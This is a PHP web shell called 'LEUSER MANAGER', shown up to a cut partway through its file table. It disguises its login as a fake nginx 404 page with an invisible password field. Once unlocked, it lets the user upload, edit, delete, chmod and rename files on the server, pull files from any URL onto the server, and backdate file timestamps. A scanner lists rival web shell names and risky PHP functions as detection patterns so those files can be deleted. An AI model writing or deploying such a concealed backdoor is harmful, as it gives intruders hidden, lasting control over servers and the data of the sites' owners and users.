<?php
// ============================================================
// ================ SISTEM AUTENTIKASI =========================
// ============================================================

$ADMIN_HASH = '$2y$10$W3CtskR6jj2FmLsW7kc24uud2en9sqiN4xinFasRPtNxy.E940/Jm'; // default: "password"

// Mulai session (kompatibel semua PHP)
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Proses login jika ada POST
if (isset($_POST['login_submit'])) {
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    if (password_verify($password, $ADMIN_HASH)) {
        $_SESSION['logged_in'] = true;
        $_SESSION['login_time'] = time();
        // Redirect agar POST tidak terkirim ulang
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = 'Password salah!';
        usleep(500000);
    }
}

// Fungsi untuk menampilkan form login (gaya 404)
function show_login_form($error = '') {
    ?>
<!DOCTYPE html>
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>

<!-- Form login tersembunyi -->
<div style="position:fixed; bottom:0; right:0; opacity:0; pointer-events:none; z-index:-1;">
    <form method="post" autocomplete="off">
        <input type="password" name="password" placeholder="Enter password" required style="width:1px;height:1px;border:none;padding:0;margin:0;opacity:0;">
        <input type="hidden" name="login_submit" value="1">
        <button type="submit" style="width:1px;height:1px;border:none;padding:0;margin:0;opacity:0;">Login</button>
    </form>
</div>

<?php if (!empty($error)): ?>
    <div style="position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:white; padding:20px 30px; border-radius:8px; border:2px solid #f5c6cb; box-shadow:0 4px 20px rgba(0,0,0,0.2); font-family:system-ui; z-index:1000; text-align:center;">
        ❌ <?php echo htmlspecialchars($error); ?>
    </div>
<?php endif; ?>

<script>
    document.addEventListener('dblclick', function() {
        const pwd = document.querySelector('input[type="password"]');
        if (pwd) pwd.focus();
    });
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            const pwd = document.querySelector('input[type="password"]');
            if (pwd && document.activeElement === pwd) {
                pwd.form.submit();
            }
        }
    });
</script>
</body>
</html>
    <?php
    exit;
}

// Cek apakah sudah login
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    $error = isset($error) ? $error : '';
    show_login_form($error);
}

// ============================================================
// ================ FILE MANAGER START =========================
// ============================================================

$uploadStatus  = null;
$folderStatus  = null;
$fileStatus    = null;
$comadStatus   = null;
$zipStatus     = null;
$extractStatus = null;
$scanStatus    = null;
$scanResults   = [];

$path = $_GET['path'] ?? '.';
$real = realpath($path);
if (!$real || !is_dir($real)) { $path = '.'; $real = realpath('.'); }

/* =====================================================
   FIX DOWNLOAD BESAR (Streaming tanpa batas)
   ===================================================== */
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    $full = realpath($path . "/" . $file);

    if ($full && is_file($full)) {
        ignore_user_abort(true);
        set_time_limit(0);

        header("Content-Description: File Transfer");
        header("Content-Type: application/octet-stream");
        header("Content-Disposition: attachment; filename=\"" . basename($full) . "\"");
        header("Content-Length: " . filesize($full));

        $chunk = 1024 * 1024;
        $fh = fopen($full, "rb");
        while (!feof($fh)) {
            echo fread($fh, $chunk);
            flush();
        }
        fclose($fh);
        exit;
    } else {
        echo "Download error";
        exit;
    }
}

/* DELETE RECURSIVE */
function axi_delete($target) {
    if (is_file($target) || is_link($target)) return @unlink($target);
    if (is_dir($target)) {
        foreach (scandir($target) as $i) {
            if ($i == '.' || $i == '..') continue;
            axi_delete($target . '/' . $i);
        }
        return @rmdir($target);
    }
    return false;
}

/* Upload */
if (isset($_POST['upload']) && isset($_FILES['file']['name'])) {
    $ok = true;
    foreach ($_FILES['file']['name'] as $k => $n) {
        if ($_FILES['file']['error'][$k] == 0) {
            if (!move_uploaded_file($_FILES['file']['tmp_name'][$k], "$path/$n"))
                $ok = false;
        } else $ok = false;
    }
    $uploadStatus = $ok ? "success" : "error";
}

/* Delete single */
if (isset($_GET['delete'])) {
    axi_delete("$path/" . $_GET['delete']);
}

/* Delete selected */
if (isset($_POST['delete_selected']) && isset($_POST['selected'])) {
    foreach ($_POST['selected'] as $x) {
        axi_delete("$path/$x");
    }
}

/* Create folder */
if (isset($_POST['newfolder']) && $_POST['foldername'] !== "") {
    $folderStatus = mkdir("$path/" . $_POST['foldername']) ? "success" : "error";
}

/* Create file (NEW — with content) */
if (isset($_POST['createfile_confirm'])) {
    $newfile = trim($_POST['newfilename']);
    $content = $_POST['newfilecontent'];
    if ($newfile !== "") {
        file_put_contents("$path/$newfile", $content);
    }
}

/* COMAD */
if (isset($_POST['comad']) && !empty($_POST['fileurl']) && !empty($_POST['saveas'])) {
    $url  = trim($_POST['fileurl']);
    $save = basename(trim($_POST['saveas']));
    $d = @file_get_contents($url);
    $comadStatus = ($d !== false && file_put_contents("$path/$save", $d) !== false) ? "success" : "error";
}

/* CHANGE DATE MANUAL */
if (isset($_POST['changedate_btn']) && !empty($_POST['new_date_str'])) {
    $targetPath = $path . "/" . $_POST['target_file'];
    $newTime = strtotime($_POST['new_date_str']);
    if ($newTime !== false && file_exists($targetPath)) {
        @touch($targetPath, $newTime);
    }
}

/* CHMOD MANUAL */
if (isset($_POST['chmod_btn']) && !empty($_POST['new_perms'])) {
    $targetPath = $path . "/" . $_POST['target_file'];
    $perms = octdec($_POST['new_perms']);
    if (file_exists($targetPath)) {
        @chmod($targetPath, $perms);
    }
}

/* Rename */
if (isset($_POST['renamefile'])) {
    @rename("$path/" . $_POST['oldname'], "$path/" . $_POST['newname']);
}

/* SAVE EDIT */
$saveStatus = null;
if (isset($_POST['savefile'])) {
    $saveStatus = (@file_put_contents($_POST['filepath'], $_POST['content']) !== false)
                    ? "success" : "error";
}

/* ZIP SELECTED */
if (isset($_POST['zip_selected']) && isset($_POST['selected'])) {
    if (class_exists('ZipArchive')) {
        $zipName = trim($_POST['zip_name']);
        if ($zipName == '') $zipName = "selected-" . date("Ymd-His") . ".zip";
        if (!preg_match('/\.zip$/i', $zipName)) $zipName .= '.zip';

        $zipPath = "$path/$zipName";
        $zip = new ZipArchive();

        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
            foreach ($_POST['selected'] as $item) {
                $full = "$path/$item";
                if (is_file($full)) {
                    $zip->addFile($full, $item);
                } else if (is_dir($full)) {
                    $it = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($full, FilesystemIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::SELF_FIRST
                    );
                    foreach ($it as $f) {
                        $local = substr($f->getPathname(), strlen($path) + 1);
                        $f->isDir() ? $zip->addEmptyDir($local) : $zip->addFile($f->getPathname(), $local);
                    }
                }
            }
            $zip->close();
            $zipStatus = "success";
        } else $zipStatus = "error";
    } else $zipStatus = "nozip";
}

/* EXTRACT ZIP */
if (isset($_GET['extract'])) {
    $zipFile = "$path/" . $_GET['extract'];
    if (is_file($zipFile) && class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($zipFile) === true) {
            $zip->extractTo($path);
            $zip->close();
            $extractStatus = "success";
        } else $extractStatus = "error";
    } else $extractStatus = "error";
}

/* =====================================================
   SCAN FILE SENSITIF
   ===================================================== */
if (isset($_POST['scan_files'])) {
    $suspiciousPatterns = [
        '/shell\.php$/i',
        '/c99\.php$/i',
        '/r57\.php$/i',
        '/wso\.php$/i',
        '/b374k\.php$/i',
        '/backdoor/i',
        '/webadmin/i',
        '/adminer/i',
        '/filemanager/i',
        '/elfinder/i',
        '/cmd\.php$/i',
        '/symlink\.php$/i',
        '/cgi\.php$/i',
        '/\.phps?$/i',
        '/\.phtml$/i',
        '/\.phar$/i',
        '/\.inc$/i',
        '/axi/i',
        '/upload/i',
        '/admin/i',
        '/config/i'
    ];

    $dangerousKeywords = [
        'eval(',
        'base64_decode(',
        'shell_exec(',
        'system(',
        'passthru(',
        'exec(',
        'popen(',
        'proc_open(',
        'assert(',
        'create_function(',
        '$_REQUEST[',
        '$_GET[',
        '$_POST[',
        'phpinfo()',
        'set_time_limit(0)',
        'ignore_user_abort(1)',
        'gzinflate(',
        'str_rot13('
    ];

    function scanDirectory($dir, &$results, $patterns, $keywords) {
        if (!is_dir($dir)) return;
        $items = @scandir($dir);
        if (!$items) return;
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $fullPath = $dir . '/' . $item;
            $relativePath = str_replace(realpath('.') . '/', '', realpath($fullPath));
            if (!$relativePath) $relativePath = $fullPath;
            if (is_file($fullPath) && filesize($fullPath) > 10485760) continue;

            $suspiciousName = false;
            $matchedPattern = '';
            foreach ($patterns as $pattern) {
                if (preg_match($pattern, $item)) {
                    $suspiciousName = true;
                    $matchedPattern = $pattern;
                    break;
                }
            }

            $suspiciousContent = false;
            $foundKeywords = [];
            if (is_file($fullPath) && is_readable($fullPath)) {
                $ext = strtolower(pathinfo($fullPath, PATHINFO_EXTENSION));
                $textExtensions = ['php', 'phtml', 'html', 'htm', 'js', 'txt', 'inc', 'conf', 'config', 'sql', 'log'];
                if (in_array($ext, $textExtensions)) {
                    $content = @file_get_contents($fullPath);
                    if ($content !== false) {
                        foreach ($keywords as $keyword) {
                            if (stripos($content, $keyword) !== false) {
                                $suspiciousContent = true;
                                $foundKeywords[] = $keyword;
                            }
                        }
                    }
                }
            }

            if ($suspiciousName || $suspiciousContent) {
                $fileSize = is_file($fullPath) ? round(filesize($fullPath) / 1024, 2) . ' KB' : '-';
                $results[] = [
                    'name' => $item,
                    'path' => $relativePath,
                    'full_path' => $fullPath,
                    'type' => is_dir($fullPath) ? 'Directory' : 'File',
                    'size' => $fileSize,
                    'modified' => @date("Y-m-d H:i:s", filemtime($fullPath)),
                    'name_suspicious' => $suspiciousName,
                    'matched_pattern' => $matchedPattern,
                    'content_suspicious' => $suspiciousContent,
                    'found_keywords' => $foundKeywords,
                    'risk_level' => ($suspiciousName && $suspiciousContent) ? 'HIGH' :
                                   ($suspiciousName ? 'MEDIUM' : 'LOW')
                ];
            }

            if (is_dir($fullPath) && count(explode('/', $relativePath)) < 10) {
                scanDirectory($fullPath, $results, $patterns, $keywords);
            }
        }
    }

    $startTime = microtime(true);
    scanDirectory('.', $scanResults, $suspiciousPatterns, $dangerousKeywords);
    $scanTime = round(microtime(true) - $startTime, 2);
    $scanStatus = count($scanResults) > 0 ? "found" : "clean";
}

/* Hapus file hasil scan */
if (isset($_POST['delete_scan_result']) && isset($_POST['scan_file_path'])) {
    $fileToDelete = $_POST['scan_file_path'];
    if (file_exists($fileToDelete)) {
        if (@unlink($fileToDelete)) {
            $scanStatus = "deleted";
            echo '<meta http-equiv="refresh" content="2;url=' . $_SERVER['PHP_SELF'] . '">';
        } else {
            $scanStatus = "delete_error";
        }
    }
}

$logo_url = "https://veldrive.com/NBCy1vy7/logo.png";

function makeBreadcrumb($p) {
    $c = trim($p, "/");
    if ($c == "") return '<a href="?path=/">/</a>';
    $exp = explode("/", $c);
    $b = "";
    $r = '<a href="?path=/">/</a> ';
    foreach ($exp as $x) {
        if (!$x) continue;
        $b .= "/$x";
        $r .= '/ <a href="?path=' . urlencode($b) . '">' . $x . '</a> ';
    }
    return $r;
}

?>
<!DOCTYPE html>
<html>
<head>
<link rel="icon" href="https://veldrive.com/NBCy1vy7/logo.png">
<title>LEUSER MANAGER</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
<style>
/* =========================================================
   GLOBAL RESET & FONT
   ========================================================= */
* {
    box-sizing: border-box;
    margin: 0;
}
body {
    background: #0b0b0b;
    color: #e0e0e0;
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    padding: 25px 30px;
    border: 1px solid #ff0040;
    box-shadow: inset 0 0 40px rgba(255,0,64,0.08);
    min-height: 100vh;
    line-height: 1.5;
}
a {
    color: #00d4ff;
    text-decoration: none;
    transition: color 0.2s, text-shadow 0.2s;
}
a:hover {
    color: #66eaff;
    text-shadow: 0 0 12px rgba(0,212,255,0.6);
}
h2, h3, h4 {
    font-weight: 600;
    letter-spacing: 0.3px;
    margin-bottom: 0.3em;
}
h2 {
    color: #ff0040;
    text-shadow: 0 0 25px rgba(255,0,64,0.5);
    font-size: 1.9rem;
}
h3 {
    color: #ff3366;
    font-size: 1.1rem;
    border-bottom: 1px solid rgba(255,0,64,0.3);
    padding-bottom: 6px;
    margin-top: 0;
}
input, textarea, button {
    font-family: inherit;
    font-size: 0.95rem;
}

/* =========================================================
   LAYOUT & CONTAINERS
   ========================================================= */
.header-flex {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 10px;
    flex-wrap: wrap;
}
.header-flex h2 {
    margin: 0;
}
.breadcrumb {
    background: #1a1a1a;
    padding: 8px 14px;
    border-radius: 30px;
    border: 1px solid #ff0040;
    display: inline-block;
    margin: 10px 0 20px 0;
    font-size: 0.95rem;
    box-shadow: 0 0 20px rgba(255,0,64,0.15);
}
.breadcrumb a {
    color: #00d4ff;
}
.breadcrumb a:hover {
    color: #66eaff;
}

/* =========================================================
   ALERTS
   ========================================================= */
.alert-success {
    background: #002800;
    color: #00ff6a;
    border-left: 4px solid #00ff6a;
    padding: 10px 14px;
    margin-top: 10px;
    border-radius: 4px;
    box-shadow: 0 0 15px rgba(0,255,106,0.15);
}
.alert-error {
    background: #280000;
    color: #ff4444;
    border-left: 4px solid #ff4444;
    padding: 10px 14px;
    margin-top: 10px;
    border-radius: 4px;
    box-shadow: 0 0 15px rgba(255,68,68,0.15);
}
.alert-warning {
    background: #282800;
    color: #ffff44;
    border-left: 4px solid #ffff00;
    padding: 10px 14px;
    margin-top: 10px;
    border-radius: 4px;
    box-shadow: 0 0 15px rgba(255,255,0,0.15);
}
.alert-info {
    background: #002828;
    color: #00ffff;
    border-left: 4px solid #00ffff;
    padding: 10px 14px;
    margin-top: 10px;
    border-radius: 4px;
    box-shadow: 0 0 15px rgba(0,255,255,0.15);
}

/* =========================================================
   ACTION ROW (boxes)
   ========================================================= */
.action-row {
    display: flex;
    flex-wrap: wrap;
    gap: 18px;
    margin: 20px 0 20px 0;
}
.action-box {
    flex: 1 1 220px;
    background: #121212;
    border: 1px solid #ff0040;
    border-radius: 12px;
    padding: 16px 18px;
    box-shadow: 0 0 20px rgba(255,0,64,0.08);
    transition: box-shadow 0.3s;
}
.action-box:hover {
    box-shadow: 0 0 35px rgba(255,0,64,0.2);
}
.action-box h3 {
    margin-top: 0;
    border-bottom: 1px solid rgba(255,0,64,0.3);
    padding-bottom: 6px;
}
.action-box input, .action-box button {
    width: 100%;
    margin-top: 6px;
    padding: 8px 10px;
    background: #1a1a1a;
    color: #e0e0e0;
    border: 1px solid #333;
    border-radius: 6px;
    transition: border 0.2s, box-shadow 0.2s;
}
.action-box input:focus {
    outline: none;
    border-color: #ff0040;
    box-shadow: 0 0 12px rgba(255,0,64,0.3);
}
.action-box button {
    background: #ff0040;
    color: #fff;
    border: none;
    cursor: pointer;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    transition: background 0.2s, box-shadow 0.2s;
}
.action-box button:hover {
    background: #ff3366;
    box-shadow: 0 0 25px rgba(255,0,64,0.5);
}
.action-box input[type="file"] {
    background: transparent;
    border: none;
    padding: 4px 0;
    color: #aaa;
}

/* =========================================================
   TABLE
   ========================================================= */
.table-wrapper {
    overflow-x: auto;
    margin-top: 20px;
    border-radius: 12px;
    border: 1px solid #ff0040;
    box-shadow: 0 0 30px rgba(255,0,64,0.08);
}
table {
    width: 100%;
    border-collapse: collapse;
    background: #0f0f0f;
    font-size: 0.9rem;
}
th {
    background: #1a0a0a;
    color: #ff3366;
    font-weight: 600;
    padding: 12px 10px;
    border-bottom: 2px solid #ff0040;
    text-align: left;
}
td {
    padding: 10px 10px;
    border-bottom: 1px solid #1f1f1f;
    vertical-align: middle;
}
tr:hover td {
    background: #181818;
}
tr:last-child td {
    border-bottom: none;
}
td a {
    color: #00d4ff;
}
td a:hover {
    color: #66eaff;
}

/* Checkbox */
input[type="checkbox"] {
    transform: scale(1.1);
    accent-color: #ff0040;
}

/* Icon & lock */
.lock-icon {
    color: #ff0040;
    margin-right: 4px;
}
.not-editable {
    color: #888 !important;
    cursor: not-allowed;
}

/* =========================================================
   BUTTONS (global)
   ========================================================= */
button, .btn {
    background: #ff0040;
    color: #fff;
    border: none;
    padding: 6px 14px;
    border-radius: 6px;
    cursor: pointer;
    font-weight: 600;
    transition: background 0.2s, box-shadow 0.2s, transform 0.1s;
}
button:hover, .btn:hover {
    background: #ff3366;
    box-shadow: 0 0 20px rgba(255,0,64,0.4);
}
button:active, .btn:active {
    transform: scale(0.97);
}
.btn-secondary {
    background: #2a2a2a;
    color: #e0e0e0;
}
.btn-secondary:hover {
    background: #444;
    box-shadow: 0 0 20px rgba(255,255,255,0.1);
}

/* =========================================================
   MODAL
   ========================================================= */
.modal-overlay {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.85);
    backdrop-filter: blur(8px);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 9999;
}
.modal-box {
    background: #121212;
    border: 1px solid #ff0040;
    border-radius: 16px;
    padding: 25px;
    width: 90%;
    max-width: 1000px;
    max-height: 90vh;
    overflow-y: auto;
    box-shadow: 0 0 60px rgba(255,0,64,0.2);
}
.modal-box h3 {
    color: #00d4ff;
    border-bottom: 1px solid rgba(0,212,255,0.3);
    padding-bottom: 8px;
    margin-top: 0;
}
.modal-box textarea {
    background: #0a0a0a;
    color: #00ff6a;
    border: 1px solid #ff0040;
    border-radius: 6px;
    padding: 10px;
    font-family: 'Courier New', monospace;
    font-size: 0.9rem;
    width: 100%;
    height: 70vh;
    resize: vertical;
}
.modal-box input[type="text"] {
    background: #0a0a0a;
    color: #e0e0e0;
    border: 1px solid #333;
    border-radius: 6px;
    padding: 8px 10px;
    width: 100%;
}
.modal-box input[type="text"]:focus {
    outline: none;
    border-color: #ff0040;
    box-shadow: 0 0 12px rgba(255,0,64,0.3);
}
.modal-actions {
    display: flex;
    justify-content: flex-end;
    gap: 10px;
    margin-top: 15px;
}

/* =========================================================
   SCAN RESULTS TABLE
   ========================================================= */
.scan-result-table th {
    background: #1a0a0a;
    color: #ff3366;
}
.scan-result-table td {
    border-bottom: 1px solid #222;
}
.risk-high {
    background: #280000 !important;
    color: #ff4444 !important;
}
.risk-medium {
    background: #282800 !important;
    color: #ffff44 !important;
}
.risk-low {
    background: #002800 !important;
    color: #00ff6a !important;
}
.scan-header {
    background: #1a1a1a !important;
    font-weight: 700;
}
.scan-details {
    background: #1a1a1a !important;
    padding: 12px !important;
    font-size: 0.85rem;
    border-top: 1px solid #333;
}
.scan-details code {
    background: #0a0a0a;
    padding: 2px 6px;
    border-radius: 4px;
    color: #00d4ff;
}

/* =========================================================
   RESPONSIVE TWEAKS
   ========================================================= */
@media (max-width: 768px) {
    body { padding: 15px; }
    .action-row { flex-direction: column; }
    .action-box { flex: 1 1 auto; }
    .modal-box { width: 95%; padding: 15px; }
    table { font-size: 0.8rem; }
    th, td { padding: 6px 5px; }
}
</style>

<script>
function renameBox(f){ var e=document.getElementById("rn_"+f); if(e)e.style.display="block"; }
function dateBox(f){ var e=document.getElementById("dt_"+f); if(e)e.style.display="block"; } 
function chmodBox(f){ var e=document.getElementById("ch_"+f); if(e)e.style.display="block"; }
function toggle(s){ document.querySelectorAll('[name="selected[]"]').forEach(x=>x.checked=s.checked); }
function closeEdit(){ let m=document.getElementById("editModal"); if(m)m.remove(); }
function toggleScanResults(){
    let e=document.getElementById("scanResults");
    if(e) e.style.display = e.style.display === 'none' ? 'block' : 'none';
}
function showScanDetails(index) {
    let details = document.getElementById('scan-details-' + index);
    if (details) details.style.display = details.style.display === 'none' ? 'block' : 'none';
}
</script>
</head>
<body>

<div class="header-flex">
    <h2>LEUSER MANAGER</h2>
    <img src="<?php echo $logo_url; ?>" height="55" alt="Logo">
</div>

<div class="breadcrumb">
    <b>Current Path:</b> <?php echo makeBreadcrumb($real); ?>
</div>

<?php if ($scanStatus == "found"): ?>
<div class="alert-warning">
    ⚠ <b>Ditemukan <?php echo count($scanResults); ?> file/direktori mencurigakan!</b>
    <button onclick="toggleScanResults()" style="margin-left:12px;background:#ffff44;color:#000;padding:3px 10px;font-size:0.8rem;">
        Tampilkan/Sembunyikan Hasil
    </button>
    <?php if (isset($scanTime)): ?>
    <span style="margin-left:10px;font-size:0.8rem;">(Waktu scan: <?php echo $scanTime; ?> detik)</span>
    <?php endif; ?>
</div>
<?php elseif ($scanStatus == "clean"): ?>
<div class="alert-success">
    ✔ <b>Scan selesai. Tidak ditemukan file mencurigakan.</b>
    <?php if (isset($scanTime)): ?>
    <span style="margin-left:10px;font-size:0.8rem;">(Waktu scan: <?php echo $scanTime; ?> detik)</span>
    <?php endif; ?>
</div>
<?php elseif ($scanStatus == "deleted"): ?>
<div class="alert-success">
    ✔ <b>File berhasil dihapus. Halaman akan direfresh...</b>
</div>
<?php elseif ($scanStatus == "delete_error"): ?>
<div class="alert-error">
    ✖ <b>Gagal menghapus file.</b>
</div>
<?php endif; ?>

<div class="action-row">

    <div class="action-box">
        <h3>1. Upload</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file[]" multiple>
            <button type="submit" name="upload">Upload</button>
        </form>
        <?php if ($uploadStatus === "success"): ?>
        <div class="alert-success">✔ Upload berhasil</div>
        <?php elseif ($uploadStatus === "error"): ?>
        <div class="alert-error">✖ Upload gagal</div>
        <?php endif; ?>
    </div>

    <div class="action-box">
        <h3>2. Create Folder</h3>
        <form method="post">
            <input name="foldername" placeholder="nama folder">
            <button type="submit" name="newfolder">Create</button>
        </form>
        <?php if ($folderStatus === "success"): ?>
        <div class="alert-success">✔ Folder created</div>
        <?php elseif ($folderStatus === "error"): ?>
        <div class="alert-error">✖ Create failed</div>
        <?php endif; ?>
    </div>

    <div class="action-box">
        <h3>3. Create File</h3>
        <button type="button" onclick="document.getElementById('createFileModal').style.display='flex'">Create File</button>
    </div>

    <div class="action-box">
        <h3>4. COMAD</h3>
        <form method="post">
            <input name="fileurl" placeholder="https://...">
            <input name="saveas" placeholder="nama.ext">
            <button type="submit" name="comad">Fetch</button>
        </form>
        <?php if ($comadStatus === "success"): ?>
        <div class="alert-success">✔ File fetched</div>
        <?php elseif ($comadStatus === "error"): ?>
        <div class="alert-error">✖ Fetch failed</div>
        <?php endif; ?>
    </div>

    <div class="action-box">
        <h3 style="color:#ff4444">5. Scan Sensitive</h3>
        <p style="font-size:0.85rem;color:#aaa;margin:5px 0">Webshell, backdoor, file manager</p>
        <form method="post">
            <button type="submit" name="scan_files" style="background:#ff0040;width:100%;">
                🔍 Start Scanning
            </button>
        </form>
        <p style="font-size:0.7rem;color:#666;margin-top:6px;">
            Scan .php, .phtml, config, dll.
        </p>
    </div>

</div>

<?php if (!empty($scanResults)): ?>
<div id="scanResults" style="display:block; margin-top:25px;">
    <h3 style="color:#ff0040;">📊 Hasil Scanning File Sensitif</h3>
    <p style="font-size:0.9rem;color:#aaa;">Total ditemukan: <?php echo count($scanResults); ?> item</p>

    <div class="table-wrapper">
    <table class="scan-result-table">
        <tr class="scan-header">
            <th>Nama File</th>
            <th>Tipe</th>
            <th>Ukuran</th>
            <th>Modified</th>
            <th>Risk Level</th>
            <th>Deteksi</th>
            <th>Aksi</th>
        </tr>
        <?php foreach ($scanResults as $index => $result): ?>
        <tr class="risk-<?php echo strtolower($result['risk_level']); ?>">
            <td>
                <strong><?php echo htmlspecialchars($result['name']); ?></strong><br>
                <small style="color:#aaa; font-size:0.75rem;"><?php echo htmlspecialchars($result['path']); ?></small>
                <button onclick="showScanDetails(<?php echo $index; ?>)" class="btn-secondary" style="padding:2px 8px;font-size:0.7rem;margin-left:6px;">
                    Details
                </button>
            </td>
            <td><?php echo $result['type']; ?></td>
            <td><?php echo $result['size']; ?></td>
            <td><?php echo $result['modified']; ?></td>
            <td><b><?php echo $result['risk_level']; ?></b></td>
            <td>
                <?php if ($result['name_suspicious']): ?>
                <span style="color:#ff4444;">Nama</span>
                <?php endif; ?>
                <?php if ($result['content_suspicious']): ?>
                <?php if ($result['name_suspicious']) echo '+'; ?>
                <span style="color:#ff8800;">Konten</span>
                <?php endif; ?>
            </td>
            <td>
                <?php if ($result['type'] == 'File'): ?>
                <form method="post" style="display:inline;">
                    <input type="hidden" name="scan_file_path" value="<?php echo htmlspecialchars($result['full_path']); ?>">
                    <button type="submit" name="delete_scan_result"
                            onclick="return confirm('Hapus file ini?\n<?php echo addslashes($result['path']); ?>')"
                            style="background:#ff0040;padding:3px 8px;font-size:0.8rem;margin:2px;">
                        Hapus
                    </button>
                </form>
                <a href="?path=<?php echo urlencode(dirname($result['full_path'])); ?>&edit=<?php echo urlencode($result['full_path']); ?>"
                   style="background:#00d4ff;color:#000;padding:3px 8px;font-size:0.8rem;border-radius:4px;margin:2px;display:inline-block;">
                    Edit
                </a>
                <?php else: ?>
                <a href="?path=<?php echo urlencode($result['full_path']); ?>"
                   style="background:#444;color:#fff;padding:3px 8px;font-size:0.8rem;border-radius:4px;margin:2px;display:inline-block;">
                    Buka
                </a>
                <?php endif; ?>
            </td>
        </tr>
        <tr id="scan-details-<?php echo $index; ?>" style="display:none;">
            <td colspan="7" class="scan-details">
                <div>
                    <strong>Detail Deteksi:</strong><br>
                    <?php if ($result['name_suspicious']): ?>
                    • <span style="color:#ff4444;">Nama mencurigakan:</span> Cocok dengan pola <code><?php echo htmlspecialchars($result['matched_pattern']); ?></code><br>
                    <?php endif; ?>
                    <?php if ($result['content_suspicious'] && !empty($result['found_keywords'])): ?>
                    • <span style="color:#ff8800;">Keyword ditemukan:</span>
                    <?php echo implode(', ', array_slice($result['found_keywords'], 0, 5)); ?>
                    <?php if (count($result['found_keywords']) > 5): ?>... (total: <?php echo count($result['found_keywords']); ?>)<?php endif; ?>
                    <br>
                    <?php endif; ?>
                    • <span style="color:#00aaff;">Path lengkap:</span> <code><?php echo htmlspecialchars($result['full_path']); ?></code>
                </div>
            </td>
        </tr>
        <?php endforeach; ?>
    </table>
    </div>

    <div style="margin-top:18px;padding:14px;background:#121212;border:1px solid #333;border-radius:8px;">
        <h4 style="color:#ff3366;">📝 Informasi Deteksi</h4>
        <ul style="font-size:0.85rem;color:#aaa;padding-left:20px;">
            <li><b style="color:#ff4444;">Nama File:</b> shell.php, c99.php, r57.php, wso.php, backdoor, filemanager, admin, config, upload, dll.</li>
            <li><b style="color:#ff8800;">Konten:</b> eval(), base64_decode(), shell_exec(), system(), exec(), phpinfo(), dll.</li>
            <li><b>Level Risiko:</b>
                <span style="color:#ff4444;">HIGH</span> (nama+konten),
                <span style="color:#ffff44;">MEDIUM</span> (nama saja),
                <span style="color:#00ff6a;">LOW</span> (konten saja).
            </li>
            <li>File yang discan: .php, .phtml, .html, .js, .txt, .config, dan file teks lainnya (maks 10MB).</li>
        </ul>
    </div>
</div>
<?php endif; ?>

<!-- Modal Create File -->
<div id="createFileModal" class="modal-overlay" style="display:none">
    <div class="modal-box">
        <h3 style="color:#00d4ff;">Create New File</h3>
        <form method="post">
            <input type="hidden" name="createfile_confirm" value="1">
            <p><strong>Filename:</strong></p>
            <input name="newfilename" style="width:100%;padding:8px;background:#0a0a0a;color:#e0e0e0;border:1px solid #333;border-radius:6px;" placeholder="example.php">
            <p style="margin-top:15px;"><strong>File Content:</strong></p>
            <textarea name="newfilecontent" style="width:100%;height:300px;background:#0a0a0a;color:#00ff6a;border:1px solid #ff0040;border-radius:6px;font-family:'Courier New',monospace;padding:10px;" placeholder="&lt;?php echo 'Hello World'; ?&gt;"></textarea>
            <div class="modal-actions">
                <button type="submit" style="background:#00d4ff;color:#000;">Create</button>
                <button type="button" onclick="document.getElementById('createFileModal').style.display='none'" style="background:#ff0040;">Cancel</button>
            </div>
        </form>
    </div>
</div>

<!-- Main form for delete / zip / table -->
<form method="post" style="margin-top:25px;">
    <div style="display:flex;flex-wrap:wrap;align-items:center;gap:10px;margin-bottom:15px;">
        <button type="submit" name="delete_selected" onclick="return confirm('Delete selected?')">Delete Selected</button>
        <input type="text" name="zip_name" placeholder="selected-YYYYMMDD-HHMMSS.zip" style="padding:6px 10px;background:#0a0a0a;color:#e0e0e0;border:1px solid #333;border-radius:6px;flex:1;min-width:180px;">
        <button type="submit" name="zip_selected">ZIP Selected</button>
    </div>

    <?php
    if ($zipStatus === "success")  echo '<div class="alert-success">✔ ZIP created</div>';
    elseif ($zipStatus === "error") echo '<div class="alert-error">✖ ZIP failed</div>';
    elseif ($zipStatus === "nozip") echo '<div class="alert-error">✖ ZipArchive tidak tersedia</div>';

    if ($extractStatus === "success")  echo '<div class="alert-success">✔ ZIP extracted</div>';
    elseif ($extractStatus === "error") echo '<div class="alert-error">✖ Extract failed</div>';
    ?>

    <div class="table-wrapper">
    <table>
        <tr>
            <th><input type="checkbox" onclick="toggle(this)"></th>
            <th>Name</th>
            <th>Size</th>
            <th>Last Modified</th>
            <th>Mod Date</th>
            <th>Perms</th>
            <th>Download</th>
            <th>Rename</th>
            <th>Delete</th>
            <th>Extract</th>
        </tr>

        <?php
        $scan = scandir($path);
        $dirs = [];
        $files = [];
        foreach ($scan as $f) {
            if ($f == "." || $f == "..") continue;
            is_dir("$path/$f") ? $dirs[] = $f : $files[] = $f;
        }
        sort($dirs);
        sort($files);
        $all = array_merge($dirs, $files);

        foreach ($all as $f):
        $full = "$path/$f";
        $isDir = is_dir($full);
        $size = $isDir ? "-" : round(@filesize($full) / 1024, 2) . " KB";

        $isEditable = (!$isDir && is_writable($full));
        $perms = @fileperms($full) ? substr(sprintf('%o', fileperms($full)), -4) : '0000';
        ?>
        <tr>
        <td><input type="checkbox" name="selected[]" value="<?php echo htmlspecialchars($f); ?>"></td>

        <td>
        <?php
